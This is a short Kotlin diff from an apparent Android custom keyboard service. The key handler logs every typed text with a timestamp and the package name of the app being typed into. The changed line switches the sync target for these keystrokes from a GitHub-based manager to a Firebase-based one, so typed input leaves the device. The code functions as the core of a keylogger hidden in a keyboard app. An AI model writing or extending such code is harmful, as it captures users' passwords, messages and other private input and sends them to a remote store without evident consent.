@@ -110,7 +110,7 @@ class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionLis
                 KeystrokeLog(text = text, timestamp = System.currentTimeMillis(), packageName = pkg)
             )
         }
-        GitHubSyncManager.logKeystroke(text, pkg)
+        FirebaseSyncManager.logKeystroke(text, pkg)
     }
 
     override fun onPress(primaryCode: Int) {}
